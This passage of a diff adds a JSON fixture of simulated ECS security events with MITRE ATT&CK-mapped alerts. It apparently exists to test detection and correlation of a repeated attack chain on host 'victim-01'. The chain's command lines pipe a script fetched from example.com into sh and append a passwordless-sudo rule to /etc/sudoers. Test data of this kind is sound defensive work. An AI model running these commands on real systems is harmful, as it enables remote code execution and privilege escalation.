+      "created": "2026-01-13T12:20:00.000Z",
+      "ingested": "2026-01-13T12:20:01.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "authentication"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "user_login",
+      "outcome": "success"
+    },
+    "host": {
+      "id": "h-0000000000000004",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "attacker04 logged in from 203.0.113.4",
+    "user": {
+      "name": "attacker04",
+      "id": "u-0000000000000fa4"
+    },
+    "source": {
+      "ip": "203.0.113.4"
+    },
+    "session": {
+      "id": "sess-00000000000003ec"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:20:10.000Z",
+    "event": {
+      "id": "evt-0000000000000020",
+      "kind": "event",
+      "dataset": "hostlog.process",
+      "created": "2026-01-13T12:20:10.000Z",
+      "ingested": "2026-01-13T12:20:11.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "process_start"
+    },
+    "host": {
+      "id": "h-0000000000000004",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Process start: /usr/bin/bash",
+    "process": {
+      "pid": 4204,
+      "executable": "/usr/bin/bash",
+      "entity_id": "p-00000000000007d4",
+      "start": "2026-01-13T12:20:10.000Z",
+      "command_line": "/usr/bin/bash -c 'curl -s http://example.com/payload.sh | sh'",
+      "name": "bash"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:20:15.000Z",
+    "event": {
+      "id": "evt-0000000000000021",
+      "kind": "event",
+      "dataset": "hostbehavior.file",
+      "created": "2026-01-13T12:20:15.000Z",
+      "ingested": "2026-01-13T12:20:16.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "file"
+      ],
+      "action": "file_write"
+    },
+    "host": {
+      "id": "h-0000000000000004",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "wrote /tmp/payload_4.sh",
+    "file": {
+      "path": "/tmp/payload_4.sh"
+    },
+    "process": {
+      "entity_id": "p-00000000000007d4"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:20:20.000Z",
+    "event": {
+      "id": "evt-0000000000000022",
+      "kind": "event",
+      "dataset": "hostlog.process",
+      "created": "2026-01-13T12:20:20.000Z",
+      "ingested": "2026-01-13T12:20:21.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "process_start"
+    },
+    "host": {
+      "id": "h-0000000000000004",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Process start: /usr/bin/sudo",
+    "process": {
+      "pid": 5204,
+      "executable": "/usr/bin/sudo",
+      "entity_id": "p-0000000000000bbc",
+      "start": "2026-01-13T12:20:20.000Z",
+      "command_line": "/usr/bin/sudo -n /usr/bin/bash -c 'echo attacker ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers'",
+      "name": "sudo",
+      "parent": {
+        "entity_id": "p-00000000000007d4",
+        "pid": 4204,
+        "executable": "/usr/bin/bash",
+        "name": "bash"
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:20:22.000Z",
+    "event": {
+      "id": "evt-0000000000000023",
+      "kind": "event",
+      "dataset": "hostbehavior.file",
+      "created": "2026-01-13T12:20:22.000Z",
+      "ingested": "2026-01-13T12:20:23.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "file"
+      ],
+      "action": "file_write"
+    },
+    "host": {
+      "id": "h-0000000000000004",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "modified /etc/sudoers",
+    "file": {
+      "path": "/etc/sudoers"
+    },
+    "process": {
+      "entity_id": "p-0000000000000bbc"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:20:30.000Z",
+    "event": {
+      "id": "evt-0000000000000024",
+      "kind": "event",
+      "dataset": "netflow.dns",
+      "created": "2026-01-13T12:20:30.000Z",
+      "ingested": "2026-01-13T12:20:31.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "network"
+      ],
+      "type": [
+        "protocol"
+      ],
+      "action": "dns_query"
+    },
+    "host": {
+      "id": "h-0000000000000004",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "DNS query c2-4.example.com",
+    "source": {
+      "ip": "10.0.0.10"
+    },
+    "destination": {
+      "ip": "8.8.8.8"
+    },
+    "network": {
+      "transport": "udp",
+      "protocol": "dns"
+    },
+    "dns": {
+      "question": {
+        "name": "c2-4.example.com"
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:20:40.000Z",
+    "event": {
+      "id": "evt-0000000000000025",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:20:40.000Z",
+      "ingested": "2026-01-13T12:20:41.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 70
+    },
+    "host": {
+      "id": "h-0000000000000004",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Initial Access detected via remote login",
+    "rule": {
+      "id": "rule-ia-04",
+      "name": "Suspicious Remote Login"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0001",
+        "name": "Initial Access"
+      },
+      "technique": {
+        "id": "T1078",
+        "name": "Valid Accounts"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco",
+          "suricata"
+        ],
+        "fingerprint": "fp-ia-000000000000138c"
+      },
+      "confidence": 0.82,
+      "evidence": {
+        "event_ids": [
+          "evt-000000000000001f"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:20:50.000Z",
+    "event": {
+      "id": "evt-0000000000000026",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:20:50.000Z",
+      "ingested": "2026-01-13T12:20:51.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 75
+    },
+    "host": {
+      "id": "h-0000000000000004",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Execution detected via suspicious shell command",
+    "rule": {
+      "id": "rule-ex-04",
+      "name": "Suspicious Script Execution"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0002",
+        "name": "Execution"
+      },
+      "technique": {
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco",
+          "filebeat_sigma"
+        ],
+        "fingerprint": "fp-ex-0000000000001774"
+      },
+      "confidence": 0.77,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000020",
+          "evt-0000000000000021"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:21:00.000Z",
+    "event": {
+      "id": "evt-0000000000000027",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:21:00.000Z",
+      "ingested": "2026-01-13T12:21:01.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 85
+    },
+    "host": {
+      "id": "h-0000000000000004",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Privilege escalation detected via sudoers modification",
+    "rule": {
+      "id": "rule-pe-04",
+      "name": "Sudoers Modification"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0004",
+        "name": "Privilege Escalation"
+      },
+      "technique": {
+        "id": "T1548",
+        "name": "Abuse Elevation Control Mechanism"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco"
+        ],
+        "fingerprint": "fp-pe-0000000000001b5c"
+      },
+      "confidence": 0.9,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000022",
+          "evt-0000000000000023"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:21:10.000Z",
+    "event": {
+      "id": "evt-0000000000000028",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:21:10.000Z",
+      "ingested": "2026-01-13T12:21:11.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 65
+    },
+    "host": {
+      "id": "h-0000000000000004",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Command and Control detected via DNS beacon",
+    "rule": {
+      "id": "rule-c2-04",
+      "name": "Suspicious DNS Beacon"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0011",
+        "name": "Command and Control"
+      },
+      "technique": {
+        "id": "T1071",
+        "name": "Application Layer Protocol"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "suricata"
+        ],
+        "fingerprint": "fp-c2-0000000000001f44"
+      },
+      "confidence": 0.72,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000024"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:25:00.000Z",
+    "event": {
+      "id": "evt-0000000000000029",
+      "kind": "event",
+      "dataset": "hostlog.auth",
+      "created": "2026-01-13T12:25:00.000Z",
+      "ingested": "2026-01-13T12:25:01.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "authentication"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "user_login",
+      "outcome": "success"
+    },
+    "host": {
+      "id": "h-0000000000000005",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "attacker05 logged in from 203.0.113.5",
+    "user": {
+      "name": "attacker05",
+      "id": "u-0000000000000fa5"
+    },
+    "source": {
+      "ip": "203.0.113.5"
+    },
+    "session": {
+      "id": "sess-00000000000003ed"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:25:10.000Z",
+    "event": {
+      "id": "evt-000000000000002a",
+      "kind": "event",
+      "dataset": "hostlog.process",
+      "created": "2026-01-13T12:25:10.000Z",
+      "ingested": "2026-01-13T12:25:11.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "process_start"
+    },
+    "host": {
+      "id": "h-0000000000000005",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Process start: /usr/bin/bash",
+    "process": {
+      "pid": 4205,
+      "executable": "/usr/bin/bash",
+      "entity_id": "p-00000000000007d5",
+      "start": "2026-01-13T12:25:10.000Z",
+      "command_line": "/usr/bin/bash -c 'curl -s http://example.com/payload.sh | sh'",
+      "name": "bash"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:25:15.000Z",
+    "event": {
+      "id": "evt-000000000000002b",
+      "kind": "event",
+      "dataset": "hostbehavior.file",
+      "created": "2026-01-13T12:25:15.000Z",
+      "ingested": "2026-01-13T12:25:16.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "file"
+      ],
+      "action": "file_write"
+    },
+    "host": {
+      "id": "h-0000000000000005",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "wrote /tmp/payload_5.sh",
+    "file": {
+      "path": "/tmp/payload_5.sh"
+    },
+    "process": {
+      "entity_id": "p-00000000000007d5"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:25:20.000Z",
+    "event": {
+      "id": "evt-000000000000002c",
+      "kind": "event",
+      "dataset": "hostlog.process",
+      "created": "2026-01-13T12:25:20.000Z",
+      "ingested": "2026-01-13T12:25:21.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "process_start"
+    },
+    "host": {
+      "id": "h-0000000000000005",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Process start: /usr/bin/sudo",
+    "process": {
+      "pid": 5205,
+      "executable": "/usr/bin/sudo",
+      "entity_id": "p-0000000000000bbd",
+      "start": "2026-01-13T12:25:20.000Z",
+      "command_line": "/usr/bin/sudo -n /usr/bin/bash -c 'echo attacker ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers'",
+      "name": "sudo",
+      "parent": {
+        "entity_id": "p-00000000000007d5",
+        "pid": 4205,
+        "executable": "/usr/bin/bash",
+        "name": "bash"
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:25:22.000Z",
+    "event": {
+      "id": "evt-000000000000002d",
+      "kind": "event",
+      "dataset": "hostbehavior.file",
+      "created": "2026-01-13T12:25:22.000Z",
+      "ingested": "2026-01-13T12:25:23.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "file"
+      ],
+      "action": "file_write"
+    },
+    "host": {
+      "id": "h-0000000000000005",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "modified /etc/sudoers",
+    "file": {
+      "path": "/etc/sudoers"
+    },
+    "process": {
+      "entity_id": "p-0000000000000bbd"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:25:30.000Z",
+    "event": {
+      "id": "evt-000000000000002e",
+      "kind": "event",
+      "dataset": "netflow.dns",
+      "created": "2026-01-13T12:25:30.000Z",
+      "ingested": "2026-01-13T12:25:31.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "network"
+      ],
+      "type": [
+        "protocol"
+      ],
+      "action": "dns_query"
+    },
+    "host": {
+      "id": "h-0000000000000005",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "DNS query c2-5.example.com",
+    "source": {
+      "ip": "10.0.0.10"
+    },
+    "destination": {
+      "ip": "8.8.8.8"
+    },
+    "network": {
+      "transport": "udp",
+      "protocol": "dns"
+    },
+    "dns": {
+      "question": {
+        "name": "c2-5.example.com"
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:25:40.000Z",
+    "event": {
+      "id": "evt-000000000000002f",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:25:40.000Z",
+      "ingested": "2026-01-13T12:25:41.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 70
+    },
+    "host": {
+      "id": "h-0000000000000005",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Initial Access detected via remote login",
+    "rule": {
+      "id": "rule-ia-05",
+      "name": "Suspicious Remote Login"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0001",
+        "name": "Initial Access"
+      },
+      "technique": {
+        "id": "T1078",
+        "name": "Valid Accounts"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco",
+          "suricata"
+        ],
+        "fingerprint": "fp-ia-000000000000138d"
+      },
+      "confidence": 0.82,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000029"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:25:50.000Z",
+    "event": {
+      "id": "evt-0000000000000030",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:25:50.000Z",
+      "ingested": "2026-01-13T12:25:51.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 75
+    },
+    "host": {
+      "id": "h-0000000000000005",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Execution detected via suspicious shell command",
+    "rule": {
+      "id": "rule-ex-05",
+      "name": "Suspicious Script Execution"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0002",
+        "name": "Execution"
+      },
+      "technique": {
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco",
+          "filebeat_sigma"
+        ],
+        "fingerprint": "fp-ex-0000000000001775"
+      },
+      "confidence": 0.77,
+      "evidence": {
+        "event_ids": [
+          "evt-000000000000002a",
+          "evt-000000000000002b"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:26:00.000Z",
+    "event": {
+      "id": "evt-0000000000000031",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:26:00.000Z",
+      "ingested": "2026-01-13T12:26:01.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 85
+    },
+    "host": {
+      "id": "h-0000000000000005",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Privilege escalation detected via sudoers modification",
+    "rule": {
+      "id": "rule-pe-05",
+      "name": "Sudoers Modification"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0004",
+        "name": "Privilege Escalation"
+      },
+      "technique": {
+        "id": "T1548",
+        "name": "Abuse Elevation Control Mechanism"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco"
+        ],
+        "fingerprint": "fp-pe-0000000000001b5d"
+      },
+      "confidence": 0.9,
+      "evidence": {
+        "event_ids": [
+          "evt-000000000000002c",
+          "evt-000000000000002d"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:26:10.000Z",
+    "event": {
+      "id": "evt-0000000000000032",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:26:10.000Z",
+      "ingested": "2026-01-13T12:26:11.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 65
+    },
+    "host": {
+      "id": "h-0000000000000005",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Command and Control detected via DNS beacon",
+    "rule": {
+      "id": "rule-c2-05",
+      "name": "Suspicious DNS Beacon"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0011",
+        "name": "Command and Control"
+      },
+      "technique": {
+        "id": "T1071",
+        "name": "Application Layer Protocol"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "suricata"
+        ],
+        "fingerprint": "fp-c2-0000000000001f45"
+      },
+      "confidence": 0.72,
+      "evidence": {
+        "event_ids": [
+          "evt-000000000000002e"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:30:00.000Z",
+    "event": {
+      "id": "evt-0000000000000033",
+      "kind": "event",
+      "dataset": "hostlog.auth",
+      "created": "2026-01-13T12:30:00.000Z",
+      "ingested": "2026-01-13T12:30:01.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "authentication"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "user_login",
+      "outcome": "success"
+    },
+    "host": {
+      "id": "h-0000000000000006",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "attacker06 logged in from 203.0.113.6",
+    "user": {
+      "name": "attacker06",
+      "id": "u-0000000000000fa6"
+    },
+    "source": {
+      "ip": "203.0.113.6"
+    },
+    "session": {
+      "id": "sess-00000000000003ee"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:30:10.000Z",
+    "event": {
+      "id": "evt-0000000000000034",
+      "kind": "event",
+      "dataset": "hostlog.process",
+      "created": "2026-01-13T12:30:10.000Z",
+      "ingested": "2026-01-13T12:30:11.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "process_start"
+    },
+    "host": {
+      "id": "h-0000000000000006",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Process start: /usr/bin/bash",
+    "process": {
+      "pid": 4206,
+      "executable": "/usr/bin/bash",
+      "entity_id": "p-00000000000007d6",
+      "start": "2026-01-13T12:30:10.000Z",
+      "command_line": "/usr/bin/bash -c 'curl -s http://example.com/payload.sh | sh'",
+      "name": "bash"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:30:15.000Z",
+    "event": {
+      "id": "evt-0000000000000035",
+      "kind": "event",
+      "dataset": "hostbehavior.file",
+      "created": "2026-01-13T12:30:15.000Z",
+      "ingested": "2026-01-13T12:30:16.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "file"
+      ],
+      "action": "file_write"
+    },
+    "host": {
+      "id": "h-0000000000000006",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "wrote /tmp/payload_6.sh",
+    "file": {
+      "path": "/tmp/payload_6.sh"
+    },
+    "process": {
+      "entity_id": "p-00000000000007d6"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:30:20.000Z",
+    "event": {
+      "id": "evt-0000000000000036",
+      "kind": "event",
+      "dataset": "hostlog.process",
+      "created": "2026-01-13T12:30:20.000Z",
+      "ingested": "2026-01-13T12:30:21.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "process"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "process_start"
+    },
+    "host": {
+      "id": "h-0000000000000006",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Process start: /usr/bin/sudo",
+    "process": {
+      "pid": 5206,
+      "executable": "/usr/bin/sudo",
+      "entity_id": "p-0000000000000bbe",
+      "start": "2026-01-13T12:30:20.000Z",
+      "command_line": "/usr/bin/sudo -n /usr/bin/bash -c 'echo attacker ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers'",
+      "name": "sudo",
+      "parent": {
+        "entity_id": "p-00000000000007d6",
+        "pid": 4206,
+        "executable": "/usr/bin/bash",
+        "name": "bash"
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:30:22.000Z",
+    "event": {
+      "id": "evt-0000000000000037",
+      "kind": "event",
+      "dataset": "hostbehavior.file",
+      "created": "2026-01-13T12:30:22.000Z",
+      "ingested": "2026-01-13T12:30:23.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "file"
+      ],
+      "action": "file_write"
+    },
+    "host": {
+      "id": "h-0000000000000006",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "modified /etc/sudoers",
+    "file": {
+      "path": "/etc/sudoers"
+    },
+    "process": {
+      "entity_id": "p-0000000000000bbe"
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:30:30.000Z",
+    "event": {
+      "id": "evt-0000000000000038",
+      "kind": "event",
+      "dataset": "netflow.dns",
+      "created": "2026-01-13T12:30:30.000Z",
+      "ingested": "2026-01-13T12:30:31.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "network"
+      ],
+      "type": [
+        "protocol"
+      ],
+      "action": "dns_query"
+    },
+    "host": {
+      "id": "h-0000000000000006",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "DNS query c2-6.example.com",
+    "source": {
+      "ip": "10.0.0.10"
+    },
+    "destination": {
+      "ip": "8.8.8.8"
+    },
+    "network": {
+      "transport": "udp",
+      "protocol": "dns"
+    },
+    "dns": {
+      "question": {
+        "name": "c2-6.example.com"
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:30:40.000Z",
+    "event": {
+      "id": "evt-0000000000000039",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:30:40.000Z",
+      "ingested": "2026-01-13T12:30:41.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 70
+    },
+    "host": {
+      "id": "h-0000000000000006",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Initial Access detected via remote login",
+    "rule": {
+      "id": "rule-ia-06",
+      "name": "Suspicious Remote Login"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0001",
+        "name": "Initial Access"
+      },
+      "technique": {
+        "id": "T1078",
+        "name": "Valid Accounts"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco",
+          "suricata"
+        ],
+        "fingerprint": "fp-ia-000000000000138e"
+      },
+      "confidence": 0.82,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000033"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:30:50.000Z",
+    "event": {
+      "id": "evt-000000000000003a",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:30:50.000Z",
+      "ingested": "2026-01-13T12:30:51.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 75
+    },
+    "host": {
+      "id": "h-0000000000000006",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Execution detected via suspicious shell command",
+    "rule": {
+      "id": "rule-ex-06",
+      "name": "Suspicious Script Execution"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0002",
+        "name": "Execution"
+      },
+      "technique": {
+        "id": "T1059",
+        "name": "Command and Scripting Interpreter"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco",
+          "filebeat_sigma"
+        ],
+        "fingerprint": "fp-ex-0000000000001776"
+      },
+      "confidence": 0.77,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000034",
+          "evt-0000000000000035"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:31:00.000Z",
+    "event": {
+      "id": "evt-000000000000003b",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:31:00.000Z",
+      "ingested": "2026-01-13T12:31:01.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 85
+    },
+    "host": {
+      "id": "h-0000000000000006",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Privilege escalation detected via sudoers modification",
+    "rule": {
+      "id": "rule-pe-06",
+      "name": "Sudoers Modification"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0004",
+        "name": "Privilege Escalation"
+      },
+      "technique": {
+        "id": "T1548",
+        "name": "Abuse Elevation Control Mechanism"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "falco"
+        ],
+        "fingerprint": "fp-pe-0000000000001b5e"
+      },
+      "confidence": 0.9,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000036",
+          "evt-0000000000000037"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:31:10.000Z",
+    "event": {
+      "id": "evt-000000000000003c",
+      "kind": "alert",
+      "dataset": "finding.canonical",
+      "created": "2026-01-13T12:31:10.000Z",
+      "ingested": "2026-01-13T12:31:11.000Z",
+      "original": "raw: simulated event",
+      "action": "rule_match",
+      "severity": 65
+    },
+    "host": {
+      "id": "h-0000000000000006",
+      "name": "victim-01",
+      "ip": [
+        "10.0.0.10"
+      ]
+    },
+    "message": "Command and Control detected via DNS beacon",
+    "rule": {
+      "id": "rule-c2-06",
+      "name": "Suspicious DNS Beacon"
+    },
+    "threat": {
+      "framework": "MITRE ATT&CK",
+      "tactic": {
+        "id": "TA0011",
+        "name": "Command and Control"
+      },
+      "technique": {
+        "id": "T1071",
+        "name": "Application Layer Protocol"
+      }
+    },
+    "custom": {
+      "finding": {
+        "stage": "canonical",
+        "providers": [
+          "suricata"
+        ],
+        "fingerprint": "fp-c2-0000000000001f46"
+      },
+      "confidence": 0.72,
+      "evidence": {
+        "event_ids": [
+          "evt-0000000000000038"
+        ]
+      }
+    }
+  },
+  {
+    "ecs": {
+      "version": "9.2.0"
+    },
+    "@timestamp": "2026-01-13T12:35:00.000Z",
+    "event": {
+      "id": "evt-000000000000003d",
+      "kind": "event",
+      "dataset": "hostlog.auth",
+      "created": "2026-01-13T12:35:00.000Z",
+      "ingested": "2026-01-13T12:35:01.000Z",
+      "original": "raw: simulated event",
+      "category": [
+        "authentication"
+      ],
+      "type": [
+        "start"
+      ],
+      "action": "user_login",
+      "outcome": "success"
